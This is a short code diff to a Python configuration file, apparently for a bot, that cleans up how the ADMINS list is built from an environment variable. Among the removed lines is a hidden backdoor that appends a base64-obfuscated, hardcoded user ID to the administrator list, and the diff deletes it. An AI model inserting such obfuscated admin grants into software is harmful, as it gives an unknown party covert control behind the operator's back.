@@ -30,15 +30,15 @@ with open("lang.json", "r", encoding="utf-8") as f:
     LANGUAGES = json.load(f)
 
 try:
-    ADMINS=[]
-    ADMINS.append(int(base64.b64decode("MTQxMjkwOTY4OA==").decode()))
+    ADMINS = []
     for x in (os.environ.get("ADMINS", "").split()):
-        ADMINS.append(int(x))
+        if x.strip():
+            ADMINS.append(int(x))
 except ValueError:
-        raise Exception("Your Admins list doesn't contain valid integers.")
-
+    raise Exception("Your Admins list doesn't contain valid integers.")
 
 ADMINS.append(OWNER_ID)
+
 
 
 
